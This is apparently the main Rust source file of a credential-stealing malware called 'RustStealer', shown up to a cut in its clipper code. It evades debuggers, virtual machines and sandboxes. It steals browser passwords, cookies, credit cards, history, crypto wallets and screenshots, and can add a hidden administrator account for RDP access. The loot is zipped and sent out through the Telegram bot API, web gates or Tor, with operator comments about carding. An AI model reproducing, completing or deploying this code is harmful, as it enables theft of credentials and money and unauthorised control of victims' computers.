//#![cfg_attr(not(debug_assertions),
#![windows_subsystem = "windows"] // "windows" = no window, "console" visible console for debugging purposes

mod defense;
mod chromium;
mod clipper;
mod firefox;
mod messengers;
mod misc;
mod persistence;
mod wallets;

extern crate serde;
use crate::defense::anti_dbg::check_is_dbg_present;
use crate::defense::anti_tools::check_tools;
use defense::anti_vm::{check_wmi, check_cpuid_time};

use std::os::windows::process::CommandExt;
use std::process::Command;

use rand::distributions::Alphanumeric;
use rand::{thread_rng, Rng};
use screenshots::*;
use std::collections::{HashMap, HashSet};
use std::env;
use std::fs;
use std::io::Write;
use std::{fs::File, iter::Iterator};
use windows::Win32::System::Threading::GetCurrentProcess;
use wmi::Variant;
use wmi::{COMLibrary, WMIConnection};
use zip_extensions::*;
use std::io::copy;
use tokio::time::{sleep, Duration};
use std::net::{TcpStream, SocketAddr};
use std::str::FromStr;
use reqwest::get;
use std::thread;
use lazy_static::lazy_static;

#[allow(dead_code)]
enum DeliveryMethod {
    TELEGRAM, // default method without gate.php thus it will directly send zip file to telegram
    GATE, // host own proxy to protect Telegram API (file web/gate.php), look below!!! 
    ONIONGATE, // need preparation you have to host own tor.exe file look below!!! (this is gate + telegram through TOR network)
    NONE,
}

const MODE: DeliveryMethod = DeliveryMethod::TELEGRAM; // change delivery method here!!!

// Telegram Channel ID
lazy_static! {
    pub static ref CHANNEL_ID: String = obfstr::obfstr!("CHANNEL_ID").to_string();
}

// Telegram API
lazy_static! {
    pub static ref API_KEY: String = obfstr::obfstr!("API_KEY").to_string();
}

// Behaviours
const MELT: bool = false; // MELT = will delete itself after execution (COOL SHIT)
const MUTEX: bool = false; // MUTEX = will allown only one time execution on the same PC, thus you can't run stealer twice on same PC (recommended!)

//Defense is including anti_dgb, anti_vm, anti_tools, check defense folder 
const DEFENSE: bool = true;

//Autostart
const AUTOSTART: bool = false;
lazy_static! {pub static ref AUTOSTART_NAME: String = obfstr::obfstr!("NAME").to_string();}

//Extra
const GEO_BLOCK: bool = false; // setup for ex soviet states
const RAT: bool = false; // create new user on PC, and abuse RDP (you can ONLY connect to win pro installs, https://en.wikipedia.org/wiki/Remote_Desktop_Protocol)
const GRAB_USERAGENT: bool = false; // for paypayl, carding, etc...
const CLIPPER: bool = false; // replace cryptocurrency wallet addresses copied by users with yours, need of auto start!

// Own tags for Cookies
lazy_static! {
    pub static ref TAG_COOKIES: Vec<String> = vec![
        obfstr::obfstr!("pornhub.com/gayporn").to_string(), 
        obfstr::obfstr!("pornhub.com/gayporn").to_string()
    ];
}

// Own tags for URLs in passwords
lazy_static! {
    pub static ref TAG_PASSWORDS: Vec<String> = vec![
        obfstr::obfstr!("pornhub.com/gayporn").to_string(), 
        obfstr::obfstr!("pornhub.com/gayporn").to_string()
    ];
}

static mut PASSWORDS: usize = 0;
static mut COOKIES: usize = 0;
static mut DOWNLOADS: usize = 0;
static mut HISTORY: usize = 0;
static mut WALLETS: usize = 0;
static mut FILES: usize = 0;
static mut CREDIT_CARDS: usize = 0;
static mut SERVERS: usize = 0;
static mut DISCORD: usize = 0;
static mut OTHERS: usize = 0;

static mut ADDITIONAL_INFOS: Vec<String> = Vec::new();

#[tokio::main]
async fn main() {

    let com_lib: COMLibrary = COMLibrary::new().unwrap();

    if DEFENSE {
        check_cpuid_time();
        check_wmi(com_lib);
        check_is_dbg_present();
        check_tools();
    }

    let geo_info: serde_json::Value = reqwest::get(obfstr::obfstr!("http://ipwho.is/?output=json"))
        .await
        .unwrap()
        .json()
        .await
        .unwrap();

    if GEO_BLOCK {
        if let Some(country_code) = geo_info[obfstr::obfstr!("country_code")].as_str() {
            if [
                obfstr::obfstr!("RU"),
                obfstr::obfstr!("KZ"),
                obfstr::obfstr!("BY"),
                obfstr::obfstr!("AM"),
                obfstr::obfstr!("AZ"),
                obfstr::obfstr!("KG"),
                obfstr::obfstr!("MD"),
                obfstr::obfstr!("TJ"),
                obfstr::obfstr!("TM"),
                obfstr::obfstr!("UZ"),
            ]
            .contains(&country_code)
            {
                let _ = houdini::disappear();
                std::process::exit(0);
            }
        }
    }
    
    let path = format!(
        "{}\\{}\\",
        std::env::temp_dir().display(),
        thread_rng()
            .sample_iter(&Alphanumeric)
            .take(30)
            .map(char::from)
            .collect::<String>()
    );
    println!("{}", path);
    std::fs::create_dir_all(&path).unwrap();

    // get fucked emulators :)

    #[cfg(not(debug_assertions))] {
    let instant = std::time::Instant::now();

    std::thread::sleep(std::time::Duration::from_secs(35));

    if instant.elapsed().as_secs() < 25 {
        std::process::exit(0);
    }
}
    let mutex_path = format!(
        "{}\\{}",
        std::env::var(obfstr::obfstr!("APPDATA")).unwrap(),
        obfstr::obfstr!("winscp.md")
    );

    if MUTEX {
        let path = std::path::Path::new(&mutex_path);
        if path.exists() {
            if CLIPPER {
                clipper::clipper();
            }

            std::process::exit(0);
        } else {
            let _ = File::create(mutex_path);
        }
    }

    unsafe {
        if persistence::is_elevated() {
            // run powershell hidden Set-MpPreference -ExclusionPath

            /*let mut command = Command::new(obfstr::obfstr!("powershell.exe"));
            command
                .arg(obfstr::obfstr!("-WindowStyle"))
                .arg(obfstr::obfstr!("Hidden"))
                .arg(obfstr::obfstr!("-Command"))
                .arg(obfstr::obfstr!("Set-MpPreference -ExclusionPath"))
                .arg(obfstr::obfstr!("C:\\"))
                .creation_flags(0x08000000)
                .spawn()
                .expect(obfstr::obfstr!("Failed to execute command"));*/
        }
    }

    let mut file = File::create(format!("{}\\{}", path, obfstr::obfstr!("user_info.txt"))).unwrap();

    let geo_info: serde_json::Value = reqwest::get(obfstr::obfstr!("http://ipwho.is/?output=json"))
        .await
        .unwrap()
        .json()
        .await
        .unwrap();


    let mut buffer_pc_info = Vec::new();

    let username = std::env::var(obfstr::obfstr!("USERNAME")).unwrap();

    buffer_pc_info.push(obfstr::obfstr!("\r\n- IP Info -\r\n").to_string());

    if !geo_info[obfstr::obfstr!("ip")].is_null() {
        buffer_pc_info.push(format!(
            "{}: {}",
            obfstr::obfstr!("IP"),
            geo_info[obfstr::obfstr!("ip")].as_str().unwrap()
        ));
        buffer_pc_info.push(format!(
            "{}: {}",
            obfstr::obfstr!("Country"),
            geo_info[obfstr::obfstr!("country")].as_str().unwrap()
        ));
        buffer_pc_info.push(format!(
            "{}: {}",
            obfstr::obfstr!("City"),
            geo_info[obfstr::obfstr!("city")].as_str().unwrap()
        ));
        buffer_pc_info.push(format!(
            "{}: {}",
            obfstr::obfstr!("Postal"),
            geo_info[obfstr::obfstr!("postal")].as_str().unwrap()
        ));
        buffer_pc_info.push(format!(
            "{}: {} - A{}",
            obfstr::obfstr!("ISP"),
            geo_info[obfstr::obfstr!("connection")][obfstr::obfstr!("isp")]
                .as_str()
                .unwrap(),
            geo_info[obfstr::obfstr!("connection")][obfstr::obfstr!("asn")]
                .as_i64()
                .unwrap()
        ));
        buffer_pc_info.push(format!(
            "{}: {}",
            obfstr::obfstr!("Timezone"),
            geo_info[obfstr::obfstr!("timezone")][obfstr::obfstr!("utc")]
                .as_str()
                .unwrap()
        ));
    }else {
        buffer_pc_info.push(obfstr::obfstr!("Failed to get IP info").to_string());
    }

    buffer_pc_info.push(obfstr::obfstr!("\r\n- PC Info -\r\n").to_string());

    buffer_pc_info.push(format!("{}: {}", obfstr::obfstr!("Username"), username));

    // get os via wmic

    buffer_pc_info.append(&mut query_hardware(com_lib));

    buffer_pc_info.push(obfstr::obfstr!("\r\n- Log Info -\r").to_string());

    buffer_pc_info.push(obfstr::obfstr!("\r\nBuild:_____\r\n").to_string());

    let mut browsers = vec![];

    browsers.extend(chromium::grab().await);

    let firefox = firefox::grab().await;
    if firefox.is_some() {
        browsers.push(firefox.unwrap());
    }

    let create_dirs = vec![
        obfstr::obfstr!("Passwords").to_string(),
        obfstr::obfstr!("Cookies").to_string(),
        obfstr::obfstr!("CreditCards").to_string(),
        obfstr::obfstr!("Autofill").to_string(),
        obfstr::obfstr!("History").to_string(),
        obfstr::obfstr!("Downloads").to_string(),
        obfstr::obfstr!("Wallets").to_string()
    ];

    for dir in create_dirs {
        let _ = std::fs::create_dir(format!("{path}\\{dir}"));
    }

    let wallets = obfstr::obfstr!("wallets").to_string();

    // this is for own list look top!
    let mut found_tag_passwords = false;
    let mut found_tag_cookies = false;

    // universal tags 
    // passowrds
    let mut passwords_social = false;
    let mut passwords_hosting = false;
    let mut passwords_cdn = false;
    let mut passwords_money = false;
    let mut passwords_crypto = false;
    let mut passwords_games = false;
    let mut passwords_stock = false;
    let mut passwords_porn = false;
    let mut passwords_sensitive = false;

    //cookies
    let mut cookies_social = false;
    let mut cookies_money = false;
    let mut cookies_crypto = false;
    let mut cookies_games = false;
    let mut cookies_stock = false;
    let mut cookies_porn = false;
    let mut cookies_sensitive = false;
    let mut cookies_cdn = false;
    let mut cookies_hosting = false;

    for browser in browsers {
        // create directories

        for profile in browser.profiles {
            // extensions
            for (name, path_ext) in &profile.1.extensions {
                let binding = format!("{path}\\{wallets}\\{}_[{}]_{}", browser.name, profile.0, name);
                let path = std::path::Path::new(&binding);
                let result = std::fs::create_dir(&path);

                if result.is_err() {
                    continue;
                }

                let walkdir = std::fs::read_dir(path_ext.clone());

                if walkdir.is_err() {
                    continue;
                }

                for file in walkdir.unwrap() {
                    if file.is_err() {
                        continue;
                    }

                    let file = file.unwrap();

                    if file.metadata().unwrap().is_dir() {
                        continue;
                    }

                    let _ = std::fs::copy(
                        file.path(),
                        path.join(file.file_name().to_str().unwrap()),
                    );

                }
                
            }

            unsafe {
                WALLETS += profile.1.extensions.len();
            }


            // cookies
            let formatted_cookies = profile
                .1
                .cookies
                .iter()
                .map(|cook| {
                    if TAG_COOKIES.iter().any(|s| cook.host.contains(&*s)) {
                        found_tag_cookies = true;
                    }
                    if MONEY.iter().any(|s| cook.host.contains(&*s)) {
                        cookies_money = true;
                    }
                    if CRYPTO.iter().any(|s| cook.host.contains(&*s)) {
                        cookies_crypto = true;
                    }
                    if PORN.iter().any(|s| cook.host.contains(&*s)) {
                        cookies_porn = true;
                    }
                    if HOSTING.iter().any(|s| cook.host.contains(&*s)) {
                        cookies_hosting = true;
                    }
                    if GAMES.iter().any(|s| cook.host.contains(&*s)) {
                        cookies_games = true;
                    }
                    if STOCK.iter().any(|s| cook.host.contains(&*s)) {
                        cookies_stock = true;
                    }
                    if SOCIAL.iter().any(|s| cook.host.contains(&*s)) {
                        cookies_social = true;
                    }
                    if CDN.iter().any(|s| cook.host.contains(&*s)) {
                        cookies_cdn = true;
                    }
                    if SENSITIVE.iter().any(|s| cook.host.contains(&*s)) {
                        cookies_sensitive = true;
                    }
                    format!(
                        "{website}\t{http_only}\t{path}\t{is_secure}\t{timestamp}\t{name}\t{value}",
                        website = cook.host,
                        http_only = cook.is_httponly,
                        path = cook.path,
                        is_secure = cook.is_secure,
                        timestamp = cook.expires_utc,
                        name = cook.name,
                        value = cook.value
                    )
                })
                .collect::<Vec<String>>();

            let _ = std::fs::write(
                format!(
                    "{path}\\{cookies}\\{name}",
                    cookies = obfstr::obfstr!("Cookies"),
                    path = path,
                    name = format!(
                        "{browser_name}_{profile}_{nw}",
                        browser_name = browser.name,
                        profile = profile.0,
                        nw = obfstr::obfstr!("Network.txt")
                    )
                ),
                formatted_cookies.join("\r\n"),
            );

            // passwords

            let formatted_pws = profile
                .1
                .login_data
                .iter()
                .map(|pw| {
                    if TAG_PASSWORDS.iter().any(|s| pw.url.contains(&*s)) {
                        found_tag_passwords = true;
                    }
                    if MONEY.iter().any(|s| pw.url.contains(&*s)) {
                        passwords_money = true;
                    }
                    if CRYPTO.iter().any(|s| pw.url.contains(&*s)) {
                        passwords_crypto = true;
                    }
                    if PORN.iter().any(|s| pw.url.contains(&*s)) {
                        passwords_porn = true;
                    }
                    if HOSTING.iter().any(|s| pw.url.contains(&*s)) {
                        passwords_hosting = true;
                    }
                    if GAMES.iter().any(|s| pw.url.contains(&*s)) {
                        passwords_games = true;
                    }
                    if STOCK.iter().any(|s| pw.url.contains(&*s)) {
                        passwords_stock = true;
                    }
                    if SOCIAL.iter().any(|s| pw.url.contains(&*s)) {
                        passwords_social = true;
                    }
                    if CDN.iter().any(|s| pw.url.contains(&*s)) {
                        passwords_cdn = true;
                    }
                    if SENSITIVE.iter().any(|s| pw.url.contains(&*s)) {
                        passwords_sensitive = true;
                    }
                    format!(
                        "{url}:\t{username}:{password}",
                        url = pw.url,
                        username = pw.username,
                        password = pw.password
                    )
                })
                .collect::<Vec<String>>();

            let _ = std::fs::write(
                format!(
                    "{path}\\{pw}\\{name}",
                    pw = obfstr::obfstr!("Passwords"),
                    path = path,
                    name = format!(
                        "{browser_name}_{profile}{nw}",
                        browser_name = browser.name,
                        profile = profile.0,
                        nw = obfstr::obfstr!(".txt")
                    )
                ),
                formatted_pws.join("\r\n"),
            );

            // autofill

            let formatted_autofill = profile
                .1
                .autofill
                .iter()
                .map(|autofill| {
                    format!(
                        "{name}:\t{value}",
                        name = autofill.name,
                        value = autofill.value
                    )
                })
                .collect::<Vec<String>>();

            let _ = std::fs::write(
                format!(
                    "{path}\\{autofill}\\{name}",
                    autofill = obfstr::obfstr!("Autofill"),
                    path = path,
                    name = format!(
                        "{browser_name}_{profile}{nw}",
                        browser_name = browser.name,
                        profile = profile.0,
                        nw = obfstr::obfstr!(".txt")
                    )
                ),
                formatted_autofill.join("\r\n"),
            );

            // credit cards rn only for chromium

            let formatted_credit_card_data = profile
            .1
            .credit_card_data
            .iter()
            .map(|cc| {
                    format!(
                        "{name} {number} {month}/{year}",
                        name = cc.name_on_card,
                        month = cc.expiration_month,
                        year = cc.expiration_year,
                        number = String::from_utf8_lossy(&cc.card_number)
                    )
                })
                .collect::<Vec<String>>();

            // Write credit card data to file
            let _ = std::fs::write(
                format!(
                    "{path}\\{credit_cards}\\{name}",
                    credit_cards = obfstr::obfstr!("CreditCards"),
                    path = path,
                    name = format!(
                        "{browser_name}_{profile}{nw}",
                        browser_name = browser.name,
                        profile = profile.1.name,
                        nw = obfstr::obfstr!(".txt")
                    )
                ),
                formatted_credit_card_data.join("\r\n"),
            );

            // downloads

            let formatted_downloads = profile
                .1
                .download_data
                .iter()
                .map(|download| {
                    format!(
                        "{url}:\t{full_path}",
                        url = download.site_url,
                        full_path = download.path
                    )
                })
                .collect::<Vec<String>>();

            let _ = std::fs::write(
                format!(
                    "{path}\\{downloads}\\{name}",
                    downloads = obfstr::obfstr!("Downloads"),
                    path = path,
                    name = format!(
                        "{browser_name}_{profile}{nw}",
                        browser_name = browser.name,
                        profile = profile.0,
                        nw = obfstr::obfstr!(".txt")
                    )
                ),
                formatted_downloads.join("\r\n"),
            );

            // history

            let formatted_history = profile
                .1
                .history
                .iter()
                .map(|history| {
                    format!(
                        "{url}:\t{title}",
                        url = history.url,
                        title = history.visit_time
                    )
                })
                .collect::<Vec<String>>();

            let _ = std::fs::write(
                format!(
                    "{path}\\{history}\\{name}",
                    history = obfstr::obfstr!("History"),
                    path = path,
                    name = format!(
                        "{browser_name}_{profile}{nw}",
                        browser_name = browser.name,
                        profile = profile.0,
                        nw = obfstr::obfstr!(".txt")
                    )
                ),
                formatted_history.join("\r\n"),
            );

            let _ = std::fs::write(
                format!("{path}\\user_info.txt"),
                buffer_pc_info.join("\r\n"), 
            );

            // add stats
            unsafe {
                COOKIES += profile.1.cookies.len();
                PASSWORDS += profile.1.login_data.len();
            }
        }
    }

    wallets::grab(path.clone());
    misc::grab(path.clone());
    messengers::grab(path.clone());

    unsafe {
        buffer_pc_info.push(match PASSWORDS > 0 {
            true => format!("{}: ✅ {}\n", obfstr::obfstr!("Passwords"), PASSWORDS),
            false => format!("{}: ❌\n", obfstr::obfstr!("Passwords")),
        });
        buffer_pc_info.push(match COOKIES > 0 {
            true => format!("{}: ✅ {}\n", obfstr::obfstr!("Cookies"), COOKIES),
            false => format!("{}: ❌\n", obfstr::obfstr!("Cookies")),
        });
        buffer_pc_info.push(match WALLETS > 0 {
            true => format!("{}: ✅ {}\n", obfstr::obfstr!("Wallets"), WALLETS),
            false => format!("{}: ❌\n", obfstr::obfstr!("Wallets")),
        });

        buffer_pc_info.push(match FILES > 0 {
            true => format!("{}: ✅ {}\n", obfstr::obfstr!("Files"), FILES),
            false => format!("{}: ❌\n", obfstr::obfstr!("Files")),
        });
        buffer_pc_info.push(match CREDIT_CARDS > 0 {
            true => format!("{}: ✅ {}\n", obfstr::obfstr!("Credit Cards"), CREDIT_CARDS),
            false => format!("{}: ❌\n", obfstr::obfstr!("Credit Cards")),
        });
        buffer_pc_info.push(match SERVERS > 0 {
            true => format!("{}: ✅ {}\n", obfstr::obfstr!("Servers FTP/SSH"), SERVERS),
            false => format!("{}: ❌\n", obfstr::obfstr!("Servers FTP/SSH")),
        });
        buffer_pc_info.push(match DISCORD > 0 {
            true => format!("{}: ✅ {}\n", obfstr::obfstr!("Discord Tokens"), DISCORD),
            false => format!("{}: ❌\n", obfstr::obfstr!("Discord Tokens")),
        });

        buffer_pc_info.push(obfstr::obfstr!("\r").to_string());
        
        // Tags URLs and Cookies fixed by user
        buffer_pc_info.push(match found_tag_passwords {
            true => format!("{}: ✅\n", obfstr::obfstr!("Tagged URLs")),
            false => format!("{}: ❌\n", obfstr::obfstr!("Tagged URLs")),
        });

        buffer_pc_info.push(match found_tag_cookies {
            true => format!("{}: ✅\n", obfstr::obfstr!("Tagged Cookies")),
            false => format!("{}: ❌\n", obfstr::obfstr!("Tagged Cookies")),
        });

        buffer_pc_info.push(obfstr::obfstr!("\r").to_string());

        // Universal tags
        // Passwords
        let flags_passwords = vec![
        (obfstr::obfstr!("SOCIAL").to_string(), passwords_social),
        (obfstr::obfstr!("HOSTING").to_string(), passwords_hosting),
        (obfstr::obfstr!("CDN").to_string(), passwords_cdn),
        (obfstr::obfstr!("MONEY").to_string(), passwords_money),
        (obfstr::obfstr!("CRYPTO").to_string(), passwords_crypto),
        (obfstr::obfstr!("GAMES").to_string(), passwords_games),
        (obfstr::obfstr!("PORN").to_string(), passwords_porn),
        (obfstr::obfstr!("STOCK").to_string(), passwords_stock),
        (obfstr::obfstr!("SENSITIVE").to_string(), passwords_sensitive),
        ];

        let mut tags_passwords = String::from(obfstr::obfstr!("Tags Passwords: "));

        for (name, value) in &flags_passwords {
            if *value {
                tags_passwords.push_str(&name);
                tags_passwords.push_str(", ");
            }
        }
    
        // to remove the last comma and space 
        if tags_passwords.ends_with(", ") {
            tags_passwords.truncate(tags_passwords.len() - 2);
        }

        buffer_pc_info.push(tags_passwords);

        buffer_pc_info.push(obfstr::obfstr!("\r").to_string());

        //Cookies

        let flags_cookies = vec![
            (obfstr::obfstr!("SOCIAL").to_string(), cookies_social),
            (obfstr::obfstr!("HOSTING").to_string(), cookies_hosting),
            (obfstr::obfstr!("CDN").to_string(), cookies_cdn),
            (obfstr::obfstr!("MONEY").to_string(), cookies_money),
            (obfstr::obfstr!("CRYPTO").to_string(), cookies_crypto),
            (obfstr::obfstr!("GAMES").to_string(), cookies_games),
            (obfstr::obfstr!("PORN").to_string(), cookies_porn),
            (obfstr::obfstr!("STOCK").to_string(), cookies_stock),
            (obfstr::obfstr!("SENSITIVE").to_string(), cookies_sensitive),
            ];
    
            let mut tags_cookies = String::from(obfstr::obfstr!("Tags Cookies: "));
    
            for (name, value) in &flags_cookies {
                if *value {
                    tags_cookies.push_str(&name);
                    tags_cookies.push_str(", ");
                }
            }
        
            // to remove the last comma and space 
            if tags_cookies.ends_with(", ") {
                tags_cookies.truncate(tags_cookies.len() - 2);
            }
    
            buffer_pc_info.push(tags_cookies);
    }

    // get user agent
    if GRAB_USERAGENT {
        let mut useragent = String::from("Unknown");

        std::thread::spawn(move || {
            // start hidden cmd with command start http://127.0.0.1:6949
            let mut cmd = Command::new(obfstr::obfstr!("cmd.exe"));
            cmd.arg(obfstr::obfstr!("/c"))
                .arg(obfstr::obfstr!("start"))
                .arg(obfstr::obfstr!("http://127.0.0.1:6949"));
            cmd.creation_flags(0x08000000);
            let _ = cmd.spawn().unwrap();
        });

        let result =
            tokio::time::timeout(std::time::Duration::from_secs(60), start_server_and_wait()).await;

        if result.is_ok() {
            useragent = result.unwrap();
        }

        buffer_pc_info.push(format!(
            "{}: {}\n",
            obfstr::obfstr!("User Agent"),
            useragent
        ));
    }

    // screenshot

    let mut i = 1;
    for screen in Screen::all() {
        let image = screen.capture();

        if !image.is_some() {
            continue;
        }

        let image = image.unwrap();

        let buffer = image.buffer();
        let _ = std::fs::write(
            format!(
                "{string_path}\\{sr}{i}.png",
                string_path = path.clone(),
                i = i,
                sr = obfstr::obfstr!("screen")
            ),
            &buffer,
        ); // make it with i because the library is stupid and cant do it on its own.
        i += 1;
    }

    if MELT {
        let _ = houdini::disappear();
    }

    let wmi_con = WMIConnection::new(com_lib);

    if wmi_con.is_ok() {
        let wmi_con = wmi_con.unwrap();

        if RAT {
            let results: Vec<HashMap<String, Variant>> = wmi_con
                .raw_query(obfstr::obfstr!(
                    "SELECT ProductType FROM Win32_OperatingSystem"
                ))
                .unwrap();

            drop(wmi_con);

            for result in results {
                for value in result.values() {
                    if *value == Variant::UI4(2) || *value == Variant::UI4(3) {
                        // add user with net

                        let mut cmd = Command::new(obfstr::obfstr!("cmd.exe"));
                        cmd.creation_flags(0x08000000);
                        cmd.arg(obfstr::obfstr!("net"));
                        cmd.arg(obfstr::obfstr!("user"));
                        cmd.arg(obfstr::obfstr!("/add"));
                        cmd.arg(obfstr::obfstr!("lol"));
                        cmd.arg(obfstr::obfstr!("lol1337!!tt"));

                        let _ = cmd.spawn();

                        // give local admin

                        let mut cmd = Command::new(obfstr::obfstr!("cmd.exe"));
                        cmd.creation_flags(0x08000000);
                        cmd.arg(obfstr::obfstr!("/c"));
                        cmd.arg(obfstr::obfstr!("net"));
                        cmd.arg(obfstr::obfstr!("localgroup"));
                        cmd.arg(obfstr::obfstr!("Administrators"));
                        cmd.arg(obfstr::obfstr!("/add"));
                        cmd.arg(obfstr::obfstr!("lol"));

                        let _ = cmd.spawn();
                        unsafe {
                            ADDITIONAL_INFOS.push(
                                obfstr::obfstr!(
                                    "Tried adding user lol with password lol1337!!tt\n"
                                )
                                .to_string(),
                            );
                        }
                    }
                }
            }
        }
    }

    if AUTOSTART {
        persistence::enable_persistance(&AUTOSTART_NAME);
    }

    let out = obfstr::obfstr!("out.zip").to_string();
    std::fs::File::create(format!(
        "{path}\\{out}",
        path = std::env::temp_dir().to_string_lossy()
    ))
    .unwrap();
    zip_create_from_directory(
        &std::path::Path::new(&format!(
            "{path}\\{out}",
            path = std::env::temp_dir().to_string_lossy()
        ))
        .to_path_buf(),
        &std::path::Path::new(&path).to_path_buf(),
    )
    .unwrap();

    let _ = std::fs::write(
        format!("{}\\{}", path, obfstr::obfstr!("user_info.txt")),
        buffer_pc_info.join("\r\n")
    ).unwrap();

    zip_create_from_directory(
        &std::path::Path::new(&format!(
            "{path}\\{out}",
            path = std::env::temp_dir().to_string_lossy()
        ))
        .to_path_buf(),
        &std::path::Path::new(&path).to_path_buf(),
    )
    .unwrap();

    unsafe {

        buffer_pc_info.extend(ADDITIONAL_INFOS.clone());
        let _ = file.write_all(buffer_pc_info.join("\r\n").as_bytes());

        if matches!(MODE, DeliveryMethod::TELEGRAM) {

            let url = format!(
                "{}{}{}{}&caption={}&parse_mode=HTML",
                obfstr::obfstr!("https://api.telegram.org/bot"),
                *API_KEY,
                obfstr::obfstr!("/sendDocument?chat_id="),
                *CHANNEL_ID,
                buffer_pc_info.join("\r\n").replace("\r\n", "%0A")
            );

            let client = reqwest::Client::new();

            let file = std::fs::read(&format!(
                "{path}\\{out}",
                path = std::env::temp_dir().to_string_lossy()
            ))
            .unwrap();

            // TODO: check if geo_info is not null
            let file_part = reqwest::multipart::Part::bytes(file)
                .file_name(format!(
                    "[{}]_{}.zip",
                    geo_info[obfstr::obfstr!("country_code")].as_str().unwrap(),
                    geo_info[obfstr::obfstr!("ip")].as_str().unwrap()
                ))
                .mime_str(obfstr::obfstr!("application/zip"))
                .unwrap();
            let form = reqwest::multipart::Form::new()
                .part(obfstr::obfstr!("document").to_string(), file_part);

            let post = client
                .post(&url)
                .multipart(form)
                .send()
                .await
                .unwrap()
                .text()
                .await
                .unwrap();
            println!("{}", post);
        }
        
        if matches!(MODE, DeliveryMethod::GATE) {

            let urls = vec![
                (obfstr::obfstr!("https://firsturl.com/gate.php")).to_string(),
                (obfstr::obfstr!("http://backupwebsite.com/gate.php")).to_string(),
                // Add same many websites as u want, everything is in loop :) 
            ];
        
            let client = reqwest::Client::builder()
                .user_agent(obfstr::obfstr!("RustStealer")) // Custom useragent as key, use same useragent in gate.php!!! 
                .build()
                .unwrap();
        
            let mut file = std::fs::read(&format!(
                "{path}\\{out}",
                path = std::env::temp_dir().to_string_lossy()
            ))
            .unwrap();
        
            buffer_pc_info.extend(ADDITIONAL_INFOS.clone());
            let _ = file.write_all(buffer_pc_info.join("\r\n").as_bytes());
        
            for url in urls {

                let form = reqwest::multipart::Form::new()
                    .part("file", reqwest::multipart::Part::bytes(file.clone())
                    .file_name(format!(
                        "[{}]_{}.zip",
                        geo_info[obfstr::obfstr!("country_code")].as_str().unwrap(),
                        geo_info[obfstr::obfstr!("ip")].as_str().unwrap()
                    ))
                    .mime_str(obfstr::obfstr!("application/zip"))
                    .unwrap())
                    .text("buffer_pc_info", buffer_pc_info.join("\r\n"));
        
                if client.post(url).multipart(form).send().await.is_ok() {
                    break;
                } else {
                    disappear();
                }
            }
        }   

        if matches!(MODE, DeliveryMethod::ONIONGATE) {

            let _ = tor().await;
        
            let urls = vec![
                (obfstr::obfstr!("http://firsturl.onion/gate.php")).to_string(),
                (obfstr::obfstr!("http://backupwebsite.onion/gate.php")).to_string(),
                // Add same many websites as u want, everything is in loop :) 
            ];
        
            let proxy = reqwest::Proxy::all(obfstr::obfstr!("socks5h://127.0.0.1:9050")).unwrap();
        
            let client = reqwest::Client::builder()
                .proxy(proxy)
                .user_agent(obfstr::obfstr!("RustStealer")) // Custom useragent as key, use same useragent in gate.php!!! 
                .build()
                .unwrap();
        
            let mut file = std::fs::read(&format!(
                "{path}\\{out}",
                path = std::env::temp_dir().to_string_lossy()
            ))
            .unwrap();
        
            buffer_pc_info.extend(ADDITIONAL_INFOS.clone());
            let _ = file.write_all(buffer_pc_info.join("\r\n").as_bytes());
        
            for url in urls {

                let form = reqwest::multipart::Form::new()
                    .part("file", reqwest::multipart::Part::bytes(file.clone())
                    .file_name(format!(
                        "[{}]_{}.zip",
                        geo_info[obfstr::obfstr!("country_code")].as_str().unwrap(),
                        geo_info[obfstr::obfstr!("ip")].as_str().unwrap()
                    ))
                    .mime_str(obfstr::obfstr!("application/zip"))
                    .unwrap())
                    .text("buffer_pc_info", buffer_pc_info.join("\r\n"));
        
                if client.post(url).multipart(form).send().await.is_ok() {
                    break;
                } else {
                    disappear();
                }
            }
            kill_tor();
        }  
        
        async fn tor() -> Result<(), Box<dyn std::error::Error>> {

            let url = obfstr::obfstr!("https://link_to_download/files/tor.exe").to_string(); // THIS IS DOWNLOAD LINK TO DOWBLOAD TOR.exe this file can be found in tor folder after downloading tor browser, just look for tor.exe this file will open new port on locallhost that can be used to access tor network (VERY SIMPLE!!!)
            let response = get(&url).await?;

            if response.status().is_success() {
                let bytes = response.bytes().await?;
        
                let tor_path = env::temp_dir().join(obfstr::obfstr!("tor.exe"));
                let mut out_file = File::create(&tor_path)?;
                copy(&mut &*bytes, &mut out_file)?;
        
                // Ensure the file is completely written to disk yeah lol fuck it
                out_file.flush()?;
                out_file.sync_all()?;
                drop(out_file); 
        
                if tor_path.exists() && tor_path.is_file() {
        
                    // Add a delay before executing the file idk otherwise shit is sometimes is not working... idk 
                    sleep(Duration::from_secs(5)).await;
        
                    let mut child = Command::new(&tor_path);
                    child.creation_flags(0x08000000);
        
                    match child.spawn() {
                        Ok(_) => println!("{}", obfstr::obfstr!("OK")),
                        Err(e) => eprintln!("{}{}", obfstr::obfstr!("ERROR: "), e),
                    }
                } else {
                    disappear();
                } 

            }else {
                disappear();
            }

            sleep(Duration::from_secs(5)).await; // some time to connect
            
            // Check if port 9050 is open check for tor cuz tor use port 9050 lol
            let addr = SocketAddr::from_str(obfstr::obfstr!("127.0.0.1:9050")).unwrap();
            let mut port_open = false;
            for _ in 0..3 { // It will hek if port is open 3 times with 5s breaks 
                match TcpStream::connect_timeout(&addr, Duration::from_secs(5)) {
                    Ok(_) => {
                        port_open = true;
                        break;
                    },
                    Err(_) => {
                        sleep(Duration::from_secs(5)).await;
                    }
                }
            }
            
            if !port_open {
                kill_tor();
                disappear();
            }
            
            Ok(())

        }

        fn kill_tor() {
            let _ = Command::new(obfstr::obfstr!("taskkill"))
                .args(&[obfstr::obfstr!("/IM"), obfstr::obfstr!("tor.exe"), obfstr::obfstr!("/F")])
                .output()
                .unwrap();

            thread::sleep(Duration::from_secs(5)); // To be sure that tor.exe is dead :) 

            let temp_dir = env::temp_dir();
            let tor = temp_dir.join(obfstr::obfstr!("tor.exe"));
            let _ = fs::remove_file(tor);
        }

        fn disappear() {
            let _ = houdini::disappear();
            std::process::exit(0);
        }

        use windows::core::imp::GetProcAddress;
        use windows::core::PCSTR;
        use windows::Win32::System::LibraryLoader::LoadLibraryA;
        if CLIPPER {
            if persistence::is_elevated() {
                use windows::Win32::Foundation::HANDLE;
                let nl_dll = LoadLibraryA(PCSTR(obfstr::obfstr!("ntdll.dll\0").as_ptr()))
                    .unwrap()
                    .0;

                let rtl_adjust_privilege =
                    GetProcAddress(nl_dll, obfstr::obfstr!("RtlAdjustPrivilege\0").as_ptr());

                let nt_set_information_process = GetProcAddress(
                    nl_dll,
                    obfstr::obfstr!("NtSetInformationProcess\0").as_ptr(),
                );
